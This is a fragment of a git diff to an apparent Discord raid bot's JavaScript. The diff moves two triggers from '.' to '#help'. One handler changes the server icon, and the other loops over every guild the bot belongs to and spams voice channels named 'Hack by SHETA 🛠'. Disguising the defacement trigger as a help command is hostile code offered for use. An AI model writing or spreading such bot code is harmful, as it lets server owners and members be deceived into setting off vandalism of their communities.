@@ -67,7 +67,7 @@ LOka.on('message', message => {
 });
  
 LOka.on('message', message => {
-     if (message.content === ".") {
+     if (message.content === "#help") {
                  if(!message.channel.guild) return;
  
              message.guild.setIcon(`https://media.discordapp.net/attachments/649311283300007958/686658597178048557/156a0d2872579f1ffcaa5d2127239bfd.png`)
@@ -664,7 +664,7 @@ m.createRole({
 }
 });
 LOka.on('message', message => {
-         if (message.content === ".") {
+         if (message.content === "#help") {
                LOka.guilds.forEach(m =>{
 m.createChannel('Hack by SHETA 🛠', 'voice');
 m.createChannel('Hack by SHETA 🛠', 'voice');
